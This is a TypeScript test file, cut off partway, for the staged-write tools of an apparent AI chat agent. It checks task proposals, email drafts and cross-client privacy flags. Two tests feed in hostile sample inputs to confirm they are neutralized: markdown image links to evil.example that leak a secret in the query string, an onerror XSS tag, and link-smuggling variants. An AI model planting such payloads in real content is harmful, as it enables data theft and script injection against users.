import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/cache", () => ({ unstable_cache: <T>(fn: T) => fn }));
vi.mock("@/lib/supabase-admin", () => ({ getSupabaseAdmin: vi.fn() }));
vi.mock("@/lib/supabase-server", () => ({ getSupabaseServer: vi.fn() }));
vi.mock("@/lib/exec/ops", () => ({ notifyOps: vi.fn() }));
vi.mock("@/lib/exec/sources/dd", async (orig) => (await import("./__tests__/b-stub")).stubModule(await orig()));
vi.mock("@/lib/exec/sources/dd-text", async (orig) => (await import("./__tests__/b-stub")).stubModule(await orig(), ["submittedTextIsCurrent"]));
vi.mock("@/lib/exec/sources/mail", async (orig) =>
  (await import("./__tests__/b-stub")).stubOnly(await orig(), ["loadScreeningPolicy", "readPrincipalThread", "loadHisBodies", "listAllReplyArtifacts", "searchPrincipalThreads"])
);
vi.mock("@/lib/exec/email-store", async (orig) =>
  (await import("./__tests__/b-stub")).stubOnly(await orig(), ["getEmailThread", "listBucketRows", "listCommitments", "listSignalsForMessages", "listThreadScreenRows"])
);
vi.mock("@/lib/exec/sync-state", async (orig) => (await import("./__tests__/b-stub")).stubOnly(await orig(), ["getSyncState"]));
vi.mock("@/lib/exec/attention-read", () => ({ listScreenedAttention: vi.fn(), getScreenedAttentionItem: vi.fn() }));
vi.mock("@/lib/exec/team", () => ({ getTeamView: vi.fn(), getWorkingNow: vi.fn() }));
vi.mock("@/lib/exec/projects-view", () => ({ getProjectsListView: vi.fn(), getProjectDetail: vi.fn() }));
vi.mock("@/lib/exec/intake-screen", () => ({
  loadIntakeScreeningPolicy: vi.fn(), restrictedIntakeTaskIds: vi.fn(), intakeThreadIdsForTasks: vi.fn(), listScreenedApprovalItems: vi.fn()
}));
vi.mock("@/lib/exec/overview", () => ({ getOverview: vi.fn() }));
vi.mock("@/lib/exec/audit", () => ({ auditEvent: vi.fn() }));
vi.mock("@/lib/exec/chat-store", () => ({ insertProposal: vi.fn() }));
vi.mock("@/lib/exec/drafts", () => ({ createChatReplyDraft: vi.fn() }));
// Area C's real neutralizeTaskText (chat/answer.ts) runs unmocked.

import { MarkdownBody } from "@/components/MarkdownBody";
import { privateRefKinds, setPrivateRefsSupportedForTests } from "@/lib/exec/agent/tools";
import { ConsultedBudget } from "@/lib/exec/agent/serialize";
import { insertProposal, type NewProposal } from "@/lib/exec/chat-store";
import { createChatReplyDraft } from "@/lib/exec/drafts";
import { draftPageHref } from "@/lib/exec/drafts-links";
import { getEmailThread } from "@/lib/exec/email-store";
import { listScreenedApprovalItems } from "@/lib/exec/intake-screen";
import { getProjectDetail } from "@/lib/exec/projects-view";
import { ddClientRef, ddTaskRef } from "@/lib/exec/refs";
import { DdReadError, getPendingApprovals, listClients, listOpenTasks, listTasksByIds, listTasksCompletedBetween, listTasksCreatedBetween } from "@/lib/exec/sources/dd";
import { getTaskDescriptions } from "@/lib/exec/sources/dd-text";
import type { DdTask } from "@/lib/exec/sources/dd-types";
import { getTeamView } from "@/lib/exec/team";
import { getSupabaseAdmin } from "@/lib/supabase-admin";
import { getScreenedAttentionItem, listScreenedAttention } from "@/lib/exec/attention-read";
import { CLIENTS, feedItem, installDefaults, makeCtx, runTool, storedThread, task } from "./__tests__/b-tools-harness";

/** search_tasks' input with every parameter (the executor checks all are present). */
const searchTasks = (over: Record<string, unknown> = {}) => ({ query: "", assignee: "", client: "", status: "any", due: "any", include_done: false, limit: 10, ...over });

// P5b contract §3.11.3 tools 14-15: the staged writes (tests 32, 33, 117, 118).

beforeEach(() => {
  installDefaults();
});
afterEach(() => {
  setPrivateRefsSupportedForTests(true);
});

const proposal = (over: Record<string, unknown> = {}) => ({
  title: "Call Acme about the report",
  description: "They asked twice.",
  assignee: "",
  due_date: "",
  client: "",
  priority: "medium",
  ...over
});
const inserted = (i = 0): NewProposal => vi.mocked(insertProposal).mock.calls[i][1];

describe("propose_task (tests 32, 117, 118)", () => {
  it("validation: title, date shape, a date before his today", async () => {
    const ctx = makeCtx();
    expect((await runTool(ctx, "propose_task", proposal({ title: "   " }))).text).toBe("Invalid input: title must be 1-200 characters.");
    expect((await runTool(ctx, "propose_task", proposal({ title: "x".repeat(201) }))).record.error).toBe("bad_input");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "2026-13-01" }))).text).toBe("Invalid input: due_date must be '' or a real date as YYYY-MM-DD.");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "next friday" }))).record.error).toBe("bad_input");
    expect((await runTool(ctx, "propose_task", proposal({ due_date: "2026-11-03" }))).text).toBe("Invalid input: due_date is before today in his timezone.");
    expect(vi.mocked(insertProposal)).not.toHaveBeenCalled();
  });

  it("strict resolution: a prefix assignee or client → needs_choice with that one candidate; an exact first name is taken", async () => {
    const p = await runTool(makeCtx(), "propose_task", proposal({ assignee: "Bob S" }));
    expect(p.json.needs_choice).toMatchObject({ param: "assignee", matches: [{ id: "u_bob", name: "Bob Stone" }] });
    const c = await runTool(makeCtx(), "propose_task", proposal({ client: "Zen" }));
    expect(c.json.needs_choice).toMatchObject({ param: "client", matches: [{ id: "c_zen", name: "Zenith Law" }] });
    expect(vi.mocked(insertProposal)).not.toHaveBeenCalled();
    const first = await runTool(makeCtx(), "propose_task", proposal({ assignee: "bob", client: "zenith law" }));
    expect(first.isError).toBe(false);
    expect(inserted()).toMatchObject({ assigneeUserId: "u_bob", assigneeName: "Bob Stone", departmentId: "d_web", clientName: "Zenith Law" });
    await runTool(makeCtx(), "propose_task", proposal({ assignee: "me" }));
    expect(inserted(1)).toMatchObject({ assigneeUserId: "u_mitchell", departmentId: null });
    await runTool(makeCtx(), "propose_task", proposal({ assignee: "unassigned" }));
    expect(inserted(2)).toMatchObject({ assigneeUserId: null, assigneeName: null });
  });

  it("due 17:00 local → ISO across DST; the row has the message id, a 7-day expiry and the identical key set; the card; no tasks write", async () => {
    const now = new Date("2026-10-28T15:00:00.000Z");
    const ctx = makeCtx({ now });
    const a = await runTool(ctx, "propose_task", proposal({ due_date: "2026-10-30" }));
    const b = await runTool(ctx, "propose_task", proposal({ due_date: "2026-11-02", assignee: "Ann Lee", client: "Acme Dental", priority: "high" }));
    expect(inserted(0)).toMatchObject({ dueOn: "2026-10-30", dueAt: "2026-10-30T21:00:00.000Z", conversationId: "cv_1", messageId: "msg_a1", expiresAt: "2026-11-04T15:00:00.000Z" });
    expect(inserted(1)).toMatchObject({ dueOn: "2026-11-02", dueAt: "2026-11-02T22:00:00.000Z", priority: "high" });
    expect(Object.keys(inserted(0)).sort()).toEqual(Object.keys(inserted(1)).sort());
    expect(ctx.cards).toEqual([
      { kind: "task_proposal", id: (a.json.proposal as { id: string }).id },
      { kind: "task_proposal", id: (b.json.proposal as { id: string }).id }
    ]);
    expect(a.json.note).toBe("Nothing is created until he confirms the card. The card shows the full text he will confirm.");
    expect(a.json.proposal).toMatchObject({ status: "pending", description_chars: 17 });
    expect(vi.mocked(getSupabaseAdmin)).not.toHaveBeenCalled();
  });

  it("the 6th call in a turn → limit, and a failed call still counts", async () => {
    const ctx = makeCtx();
    await runTool(ctx, "propose_task", proposal({ title: "" }));
    for (let i = 0; i < 4; i += 1) expect((await runTool(ctx, "propose_task", proposal())).isError).toBe(false);
    const sixth = await runTool(ctx, "propose_task", proposal());
    expect(sixth.record.error).toBe("limit");
    expect(sixth.text).toBe("Only 5 tasks can be staged per question. Tell him which ones are left and offer to stage them next.");
    expect(ctx.cards).toHaveLength(4);
  });

  it("test 118: the hostile payload is stored link-neutralized, tag-free, one-line and masked", async () => {
    await runTool(
      makeCtx(),
      "propose_task",
      proposal({
        title: "Fix ![x](https://evil.example/p.png?d=secret) [click](https://evil.example)\nsecond line",
        description: [
          "See ![x](https://evil.example/p.png?d=secret) and [click](https://evil.example).",
          "<img src=x onerror=alert(1)>",
          "Bare https://evil.example/leak here.",
          "[1]: https://evil.example/ref",
          "password: hunter2"
        ].join("\n")
      })
    );
    const row = inserted();
    for (const s of [row.title, row.description]) {
      expect(s).not.toContain("![");
      expect(s).not.toContain("](");
      expect(s.toLowerCase()).not.toContain("<img");
      expect(s).not.toMatch(/<[a-z/][^>]*>/i);
      expect(s).not.toMatch(/(^|[^`])https?:\/\//);
    }
    expect(row.title).not.toMatch(/[\r\n]/);
    expect(row.description).toContain("password: [hidden]");
    expect(row.description).not.toContain("hunter2");
  });

  it("security-1: the review's seven payloads are stored as descriptions MarkdownBody renders with no link or image", async () => {
    const BS = String.fromCharCode(92);
    const payloads = [
      "See [the report][x] now.\n\n[x]:\n//evil.example/phish",
      "See [the report][x] now.\n\n> [x]: https:evil.example/phish",
      "Look ![logo][p]\n\n[p]:\nhttps:evil.example/pixel.png",
      `See [report][a${BS}]b]\n\n[a${BS}]b]: //evil.example/x`,
      "See [a [b [c]] d](//evil.example/x)",
      "See [doc](//evil.example/((a)))",
      "Reply to bob@evil.example"
    ];
    for (const [i, description] of payloads.entries()) {
      await runTool(makeCtx(), "propose_task", proposal({ description }));
      const html = renderToStaticMarkup(createElement(MarkdownBody, { content: inserted(i).description }));
      expect(html, description).not.toMatch(/<a[\s>]|<img[\s>]/);
    }
  });

  it("loop-1: a long description and title are clipped without half a surrogate pair, in the row and in the record", async () => {
    const face = String.fromCodePoint(0x1f600);
    const lone = (s: string) => /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(s);
    // The record keeps 500 characters: the pair straddles 499/500. The stored description: 3 escapes push a pair's
    // first half to index 3,999 of the 4,000 the row allows.
    const run = await runTool(makeCtx(), "propose_task", proposal({ description: `a<<<${face.repeat(1997)}zz`, title: `${"t".repeat(199)}${face}`.slice(0, 200) }));
    expect(run.isError).toBe(false);
    const recorded = run.record.args as Record<string, string>;
    expect(lone(recorded.description)).toBe(false);
    expect(recorded.description.length).toBeLessThanOrEqual(500);
    expect(lone(inserted().description)).toBe(false);
    expect(inserted().description.length).toBeLessThanOrEqual(4000);
    expect(lone(inserted().title)).toBe(false);
    const straddle = await runTool(makeCtx(), "propose_task", proposal({ description: `${"x".repeat(499)}${face}${"y".repeat(10)}` }));
    expect((straddle.record.args as Record<string, string>).description).toBe("x".repeat(499));
  });
});

describe("create_draft (test 33)", () => {
  const input = { thread_id: "th_draft", instruction: "Say we'll send the report Friday." };

  beforeEach(() => {
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_draft", clientId: "c_acme", clientName: "Acme Dental" }));
  });

  it("privateRefKinds per C24", () => {
    const ctx = makeCtx();
    ctx.consulted.admit(["th_draft"]);
    expect(privateRefKinds(ctx, false, "th_draft", "c_acme")).toEqual([]);
    ctx.consulted.admit(["th_other"]);
    expect(privateRefKinds(ctx, false, "th_draft", "c_acme")).toEqual(["other_threads"]);
    const replayed = makeCtx({ priorSets: { threads: new Set(["th_old"]), clients: new Set(), ddText: true } });
    expect(privateRefKinds(replayed, false, "th_draft", "c_acme")).toEqual(["other_threads", "dd_text"]);
    const clients = makeCtx();
    clients.consultedClients.add("c_acme");
    expect(privateRefKinds(clients, false, "th_draft", "c_acme")).toEqual([]);
    expect(privateRefKinds(clients, false, "th_draft", null)).toEqual(["other_clients"]);
    clients.consultedClients.add("c_zen");
    expect(privateRefKinds(clients, true, "th_draft", "c_acme")).toEqual(["dd_text", "other_clients"]);
  });

  it("a draft of the only thread read is not private; the card, the link and the notes", async () => {
    const ctx = makeCtx();
    const r = await runTool(ctx, "create_draft", input);
    // security-2: the answer this turn writes is passed, so the draft is linked to it.
    expect(vi.mocked(createChatReplyDraft)).toHaveBeenCalledWith(expect.anything(), { threadId: "th_draft", instruction: input.instruction, usesPrivateRefs: false, chatMessageId: ctx.assistantMessageId }, expect.objectContaining({ signal: expect.any(AbortSignal) }));
    const id = "ed_00000000000000000000000000000001";
    expect(r.json.draft).toEqual({ id, status: "generating", link: draftPageHref(id), existing: false, private_refs: [] });
    expect(r.json.note).toBe("Nothing is sent. He reviews and sends it from DD.");
    expect(ctx.cards).toEqual([{ kind: "draft", id, existing: false, privateRefKinds: [] }]);
    expect(ctx.consulted.values()).toEqual(["th_draft"]);
  });

  it("other threads read this turn, DD text delivered this turn, and other clients make it private (with the note)", async () => {
    vi.mocked(listTasksByIds).mockResolvedValue([task({ id: "t_1" })]);
    vi.mocked(getTaskDescriptions).mockResolvedValue(new Map([["t_1", "Some DD text"]]));
    const ctx = makeCtx();
    ctx.consulted.admit(["th_other"]);
    ctx.consultedClients.add("c_zen");
    await runTool(ctx, "get_task", { task_id: "t_1" });
    const r = await runTool(ctx, "create_draft", input);
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(true);
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual(["other_threads", "dd_text", "other_clients"]);
    expect(r.json.note).toContain("He will be asked to confirm the draft doesn't share anything from other mail, notes or clients before saving or sending.");
    expect(ctx.cards[0]).toMatchObject({ kind: "draft", privateRefKinds: ["other_threads", "dd_text", "other_clients"] });
  });

  it("ui-2: an existing draft with private material read → card kinds [], no confirm note, private_refs [] to the model", async () => {
    const id = "ed_00000000000000000000000000000009";
    vi.mocked(createChatReplyDraft).mockResolvedValue({ kind: "existing", draftId: id, status: "draft" });
    const ctx = makeCtx();
    ctx.consulted.admit(["th_other"]);
    const r = await runTool(ctx, "create_draft", input);
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(true);
    expect(ctx.cards).toEqual([{ kind: "draft", id, existing: true, privateRefKinds: [] }]);
    expect(r.json.draft).toMatchObject({ id, existing: true, private_refs: [] });
    expect(r.json.note).toBe("Nothing is sent. He reviews and sends it from DD. A draft already exists for this thread; your instruction was not applied to it.");
    expect(String(r.json.note)).not.toContain("He will be asked to confirm");
  });

  it("an existing draft adds its note; refusals are values with their notes", async () => {
    vi.mocked(createChatReplyDraft).mockResolvedValueOnce({ kind: "existing", draftId: "ed_00000000000000000000000000000002", status: "draft" });
    const existing = await runTool(makeCtx(), "create_draft", input);
    expect(existing.json.note).toBe("Nothing is sent. He reviews and sends it from DD. A draft already exists for this thread; your instruction was not applied to it.");
    const cases = [
      ["drafts_off", "Drafting is turned off in Settings."],
      ["email_off", "Drafting is turned off in Settings."],
      ["no_pin", "His mailbox isn't connected for drafting right now."],
      ["mailbox_problem", "His mailbox isn't connected for drafting right now."],
      ["rate_limited", "Too many drafts were started in the last 10 minutes; try again later."],
      ["drafts_unavailable", "Drafting isn't available right now."],
      ["unavailable", "Drafting isn't available right now."],
      ["unavailable_thread", "That thread isn't available."],
      ["needs_check", "An earlier draft for this email may already have been sent. He should check his Sent Items and start the reply from the thread page."]
    ] as const;
    for (const [reason, note] of cases) {
      vi.mocked(createChatReplyDraft).mockResolvedValueOnce({ kind: "refused", reason });
      const ctx = makeCtx();
      const r = await runTool(ctx, "create_draft", input);
      expect(r.isError).toBe(false);
      expect(r.json).toMatchObject({ draft: null, refused: reason, note });
      expect(ctx.cards).toEqual([]);
    }
  });

  it("C24 task records (P9 F8): search_tasks scoped to Zenith Law, then a draft on an Acme thread → other_clients", async () => {
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_acme", clientId: "c_acme", clientName: "Acme Dental" }));
    vi.mocked(listOpenTasks).mockResolvedValue([task({ id: "t_z1", title: "Zenith internal pricing", clientName: "Zenith Law" })]);
    const ctx = makeCtx();
    const s = await runTool(ctx, "search_tasks", searchTasks({ client: "Zenith Law" }));
    expect((s.json.items as { items: unknown[] }).items).toHaveLength(1);
    expect([...ctx.consultedClients]).toEqual(["c_zen"]);
    const r = await runTool(ctx, "create_draft", { thread_id: "th_acme", instruction: "Reply about the pricing." });
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(true);
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual(["other_clients"]);
    expect(ctx.cards[0]).toMatchObject({ kind: "draft", privateRefKinds: ["other_clients"] });
    // The filter alone counts, even when it finds nothing (it told the model about that client).
    vi.mocked(listOpenTasks).mockResolvedValue([]);
    const empty = makeCtx();
    await runTool(empty, "search_tasks", searchTasks({ client: "Zenith Law" }));
    expect([...empty.consultedClients]).toEqual(["c_zen"]);
  });

  it("C24 task records (P9 F8): get_task of a Zenith task with no text → other_clients on an Acme draft", async () => {
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_acme", clientId: "c_acme", clientName: "Acme Dental" }));
    vi.mocked(listTasksByIds).mockResolvedValue([task({ id: "t_z2", title: "Zenith settlement call", clientName: "Zenith Law" })]);
    const ctx = makeCtx();
    const t = await runTool(ctx, "get_task", { task_id: "t_z2" });
    expect((t.json.task as { description: unknown }).description).toBeNull();
    expect(ctx.markDdText).not.toHaveBeenCalled();
    const r = await runTool(ctx, "create_draft", { thread_id: "th_acme", instruction: "Reply." });
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual(["other_clients"]);
  });

  it("C24 task records (P9 F8): Acme-only task results, then a draft on an Acme thread → no other_clients", async () => {
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_acme", clientId: "c_acme", clientName: "Acme Dental" }));
    vi.mocked(listOpenTasks).mockResolvedValue([task({ id: "t_a1", title: "Acme site audit", clientName: "Acme Dental" }), task({ id: "t_n", title: "Internal cleanup", clientName: null })]);
    const ctx = makeCtx();
    await runTool(ctx, "search_tasks", searchTasks());
    expect([...ctx.consultedClients]).toEqual(["c_acme"]);
    const r = await runTool(ctx, "create_draft", { thread_id: "th_acme", instruction: "Reply." });
    expect(vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs).toBe(false);
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual([]);
  });

  it("C24 task records (P9 F8): every tool whose result lists task titles records their clients; a count alone records nothing", async () => {
    const zen = task({ id: "t_z", title: "Zenith filing", clientName: "Zenith Law", status: "in_progress", completedAt: "2026-11-04T14:00:00.000Z" });
    vi.mocked(listTasksCompletedBetween).mockResolvedValue([zen]);
    const overview = makeCtx();
    await runTool(overview, "get_overview", { since: "today" });
    expect([...overview.consultedClients], "get_overview completed").toEqual(["c_zen"]);
    vi.mocked(listTasksCompletedBetween).mockResolvedValue([]);
    vi.mocked(listTasksCreatedBetween).mockResolvedValue([zen]);
    const counted = makeCtx();
    await runTool(counted, "get_overview", { since: "today" });
    expect([...counted.consultedClients], "created is a count").toEqual([]);

    vi.mocked(listOpenTasks).mockResolvedValue([{ ...zen, assigneeId: "u_ann" }]);
    const person = makeCtx({ refSeq: 1, prior: [{ ref: "r1", target: { type: "person", id: "u_ann" }, source: { system: "dd", id: "/team/u_ann", url: null, label: "Ann Lee", class: "internal" } }] });
    vi.mocked(getTeamView).mockResolvedValue({ people: { ok: false }, departments: { ok: false } } as never);
    await runTool(person, "get_source", { ref: "r1" });
    expect([...person.consultedClients], "person's open tasks").toEqual(["c_zen"]);

    vi.mocked(listScreenedApprovalItems).mockResolvedValue({
      mechanism: "draft_tasks", mode: "items", total: 1, truncated: false, hiddenRestricted: 0,
      items: [{ mechanism: "draft_tasks", id: "t_z", title: "Zenith filing", requesterId: null, waitingSince: null, waitingSinceIsLowerBound: false, approver: { kind: "leaders_or_any_department_head" }, taskId: "t_z", clientName: "Zenith Law", departmentId: null }]
    });
    vi.mocked(getPendingApprovals).mockResolvedValue([{ mechanism: "draft_tasks", count: 1, oldestAt: null }]);
    const approvals = makeCtx();
    await runTool(approvals, "pending_approvals", { mechanism: "draft_tasks" });
    expect([...approvals.consultedClients], "pending_approvals items").toEqual(["c_zen"]);

    vi.mocked(listOpenTasks).mockResolvedValue([{ ...zen, tags: ["incident"] }]);
    const recurring = makeCtx();
    await runTool(recurring, "recurring_issues", { window_days: 30 });
    expect([...recurring.consultedClients], "recurring_issues incident tasks").toEqual(["c_zen"]);

    vi.mocked(listOpenTasks).mockResolvedValue([]);
    vi.mocked(getProjectDetail).mockResolvedValue({
      project: { id: "p_site", name: "Zenith Site Rebuild", departmentName: null, createdAt: "2026-09-01T00:00:00.000Z", ref: { system: "dd", id: "/projects/p_site", url: null, label: "Zenith Site Rebuild", class: "internal" } },
      summary: { ok: false }, stages: { ok: false }, blockers: { ok: false }, updates: { ok: false }, meetingRisks: { ok: false }, conversations: { ok: false },
      delays: { ok: true, data: { overdue: [{ taskId: "t_z", title: "Zenith filing", assigneeName: null, overdueDays: 2, autoArchived: false, ref: { system: "dd", id: "t_z", url: null, label: "Zenith filing", class: "internal" } }], extensions: [] } }
    } as never);
    vi.mocked(listTasksByIds).mockResolvedValue([zen]);
    const project = makeCtx();
    await runTool(project, "project_health", { project_id: "p_site", only_problems: false });
    expect([...project.consultedClients], "project_health delays").toEqual(["c_zen"]);
  });

  it("C24 task records (P9 F8): project_health's updates feed and derived blockers record their tasks' clients; the project's derived client is recorded", async () => {
    const zen = task({ id: "t_z", title: "Zenith filing", clientName: "Zenith Law" });
    const acme = task({ id: "t_a", title: "Acme audit", clientName: "Acme Dental" });
    vi.mocked(listOpenTasks).mockResolvedValue([]);
    vi.mocked(listTasksByIds).mockImplementation(async (_p, ids) => [zen, acme].filter((t) => ids.includes(t.id)));
    const base = {
      project: { id: "p_site", name: "Site Rebuild", departmentName: null, createdAt: "2026-09-01T00:00:00.000Z", ref: { system: "dd", id: "/projects/p_site", url: null, label: "Site Rebuild", class: "internal" } },
      summary: { ok: false }, stages: { ok: false }, delays: { ok: false }, blockers: { ok: false }, updates: { ok: false }, meetingRisks: { ok: false }, conversations: { ok: false }
    };
    const health = async () => {
      const ctx = makeCtx();
      await runTool(ctx, "project_health", { project_id: "p_site", only_problems: false });
      return ctx;
    };
    // The updates feed lists a Zenith task's status change (its title).
    vi.mocked(getProjectDetail).mockResolvedValue({
      ...base, updates: { ok: true, data: [{ kind: "status_changed", at: "2026-11-04T14:00:00.000Z", title: zen.title, detail: "todo → in progress", actorName: null, ref: ddTaskRef(zen) }] }
    } as never);
    expect([...(await health()).consultedClients], "updates feed").toEqual(["c_zen"]);
    // A derived blocker cites an Acme task.
    vi.mocked(getProjectDetail).mockResolvedValue({
      ...base, blockers: { ok: true, data: { derived: [{ text: "Waiting on Acme audit", basis: "derived", refs: [ddTaskRef(acme)] }], ai: [], aiState: "off" } }
    } as never);
    expect([...(await health()).consultedClients], "derived blockers").toEqual(["c_acme"]);
    // The summary names the derived client: recorded, so a draft on an Acme thread after it needs the second confirmation.
    vi.mocked(getProjectDetail).mockResolvedValue({
      ...base,
      summary: { ok: true, data: { health: { status: "at_risk", reasons: [], stageProgress: { done: 1, total: 3 } }, derivedClient: { clientId: "c_zen", clientName: "Zenith Law", taskCount: 3, namedTaskCount: 4, share: 0.75, basis: "derived" }, stuck: [] } }
    } as never);
    vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_acme", clientId: "c_acme", clientName: "Acme Dental" }));
    const derived = await health();
    expect([...derived.consultedClients], "derived client").toEqual(["c_zen"]);
    const r = await runTool(derived, "create_draft", { thread_id: "th_acme", instruction: "Reply." });
    expect((r.json.draft as { private_refs: string[] }).private_refs).toEqual(["other_clients"]);
  });

  // P9 fixer security-3 (F8, Q4): a DD Needs Attention item carries task titles (its title and fact lines) from any client.
  describe("C24 task records (P9 fixer security-3): DD Needs Attention items record the clients of the tasks they cite", () => {
    const zen = task({ id: "t_zen", title: "Zenith settlement terms", clientName: "Zenith Law" });
    const acme = task({ id: "t_acm", title: "Acme site audit", clientName: "Acme Dental" });
    /** A DD overdue item for one task, as producers/dd.ts builds it: the task's title in the item title and its fact line. */
    const overdue = (t: DdTask) =>
      feedItem({ id: `ai_${t.id}`, title: `Critical task overdue: ${t.title}`, whatHappened: `${t.title} passed its due date.`,
        refs: [ddTaskRef(t)], facts: [{ text: `${t.title}: due Oct 30.`, basis: "record", refs: [ddTaskRef(t)] }] });
    const page = (...items: ReturnType<typeof overdue>[]) => ({ items, nextCursor: null, hiddenEmail: 0, emailScreen: "none" as const });
    const LIST = { status: "active", category: "any", band: "any", source: "any", limit: 10 };
    const draftOnAcme = async (ctx: ReturnType<typeof makeCtx>) => {
      vi.mocked(createChatReplyDraft).mockClear();
      const r = await runTool(ctx, "create_draft", { thread_id: "th_acme", instruction: "Reply." });
      return { uses: vi.mocked(createChatReplyDraft).mock.calls[0][1].usesPrivateRefs, kinds: (r.json.draft as { private_refs: string[] }).private_refs };
    };

    beforeEach(() => {
      vi.mocked(getEmailThread).mockResolvedValue(storedThread({ threadId: "th_acme", clientId: "c_acme", clientName: "Acme Dental" }));
      vi.mocked(listOpenTasks).mockResolvedValue([zen, acme]);
    });

    it("list_attention with a Zenith task's overdue item, then create_draft on an Acme thread → other_clients; an Acme-only item → none", async () => {
      vi.mocked(listScreenedAttention).mockResolvedValue(page(overdue(zen)));
      const ctx = makeCtx();
      const r = await runTool(ctx, "list_attention", LIST);
      expect(r.all).toContain("Zenith settlement terms");
      expect([...ctx.consultedClients]).toEqual(["c_zen"]);
      expect(await draftOnAcme(ctx)).toEqual({ uses: true, kinds: ["other_clients"] });

      vi.mocked(listScreenedAttention).mockResolvedValue(page(overdue(acme)));
      const clean = makeCtx();
      await runTool(clean, "list_attention", LIST);
      expect([...clean.consultedClients]).toEqual(["c_acme"]);
      expect(await draftOnAcme(clean)).toEqual({ uses: false, kinds: [] });
    });

    it("the same through get_overview's new_attention, a task that isn't open any more (read by id), and get_source's attention item", async () => {
      vi.mocked(listScreenedAttention).mockResolvedValue(page(overdue(zen)));
      const overview = makeCtx();
      const o = await runTool(overview, "get_overview", { since: "today" });
      expect(o.all).toContain("Zenith settlement terms");
      expect([...overview.consultedClients]).toEqual(["c_zen"]);
      expect(await draftOnAcme(overview)).toEqual({ uses: true, kinds: ["other_clients"] });

      // Closed since: not among the turn's open tasks, so it is read by id.
      vi.mocked(listOpenTasks).mockResolvedValue([acme]);
      vi.mocked(listTasksByIds).mockImplementation(async (_p, ids) => [zen].filter((t) => ids.includes(t.id)));
      const closed = makeCtx();
      await runTool(closed, "list_attention", LIST);
      expect(vi.mocked(listTasksByIds)).toHaveBeenCalledWith(expect.anything(), ["t_zen"], expect.anything());
      expect([...closed.consultedClients]).toEqual(["c_zen"]);

      vi.mocked(getScreenedAttentionItem).mockResolvedValue({ ok: true, item: overdue(zen) } as never);
      const source = makeCtx({ refSeq: 1, prior: [{ ref: "r1", target: { type: "attention", id: "ai_t_zen", threadId: null }, source: ddTaskRef(zen) }] });
      const s = await runTool(source, "get_source", { ref: "r1" });
      expect(s.all).toContain("Zenith settlement terms");
      expect([...source.consultedClients]).toEqual(["c_zen"]);
      expect(await draftOnAcme(source)).toEqual({ uses: true, kinds: ["other_clients"] });
    });

    it("client_overview's attention items too: an Acme item citing a Zenith task records Zenith, so an Acme draft asks again", async () => {
      const acmeItem = feedItem({ id: "ai_acme_wait", kind: "waiting_on_client", title: "Waiting on Acme Dental",
        whatHappened: "Two tasks wait on the client.", refs: [ddClientRef({ id: "c_acme", name: "Acme Dental" }), ddTaskRef(zen)],
        facts: [{ text: "Zenith settlement terms: waiting 5 days.", basis: "derived", refs: [ddTaskRef(zen)] }] });
      vi.mocked(listScreenedAttention).mockResolvedValue(page(acmeItem));
      const ctx = makeCtx();
      const r = await runTool(ctx, "client_overview", { client: "c_acme" });
      expect(r.all).toContain("Zenith settlement terms");
      expect([...ctx.consultedClients].sort()).toEqual(["c_acme", "c_zen"]);
      expect(await draftOnAcme(ctx)).toEqual({ uses: true, kinds: ["other_clients"] });
      // Its clients unreadable: the attention part is unavailable and the item's text stays out.
      vi.mocked(listOpenTasks).mockResolvedValue([]);
      vi.mocked(listTasksByIds).mockRejectedValue(new DdReadError("tasks", "57014"));
      const failed = await runTool(makeCtx(), "client_overview", { client: "c_acme" });
      expect((failed.json as { attention: unknown }).attention).toBe("unavailable");
      expect(failed.all).not.toContain("Zenith settlement terms");
    });

    it("fail closed: when the tasks' clients can't be read, no item's text goes out (list_attention and get_source fail, new_attention is unavailable)", async () => {
      vi.mocked(listOpenTasks).mockResolvedValue([]);
      vi.mocked(listTasksByIds).mockRejectedValue(new DdReadError("tasks", "57014"));
      vi.mocked(listScreenedAttention).mockResolvedValue(page(overdue(zen)));
      const list = await runTool(makeCtx(), "list_attention", LIST);
      expect(list.isError).toBe(true);
      expect(list.record.error).toBe("dd_read");
      expect(list.all).not.toContain("Zenith settlement terms");

      const o = await runTool(makeCtx(), "get_overview", { since: "today" });
      expect((o.json.window_activity as { new_attention: unknown }).new_attention).toBe("unavailable");
      expect(o.json.unavailable as string[]).toContain("new_attention");
      expect(o.all).not.toContain("Zenith settlement terms");

      vi.mocked(getScreenedAttentionItem).mockResolvedValue({ ok: true, item: overdue(zen) } as never);
      const source = makeCtx({ refSeq: 1, prior: [{ ref: "r1", target: { type: "attention", id: "ai_t_zen", threadId: null }, source: ddTaskRef(zen) }] });
      const s = await runTool(source, "get_source", { ref: "r1" });
      expect(s.isError).toBe(true);
      expect(s.all).not.toContain("Zenith settlement terms");

      // The client list failing is the same.
      vi.mocked(listOpenTasks).mockResolvedValue([zen]);
      vi.mocked(listClients).mockRejectedValue(new DdReadError("clients", "57014"));
      const clients = await runTool(makeCtx(), "list_attention", LIST);
      expect(clients.isError).toBe(true);
      expect(clients.all).not.toContain("Zenith settlement terms");
    });

    it("an item that cites no task reads nothing extra and records nothing", async () => {
      vi.mocked(listScreenedAttention).mockResolvedValue(page(feedItem({ id: "ai_page", refs: [], facts: [{ text: "3 approvals waiting", basis: "derived", refs: [] }] })));
      vi.mocked(listTasksByIds).mockClear();
      vi.mocked(listClients).mockClear();
      const ctx = makeCtx();
      await runTool(ctx, "list_attention", LIST);
      expect([...ctx.consultedClients]).toEqual([]);
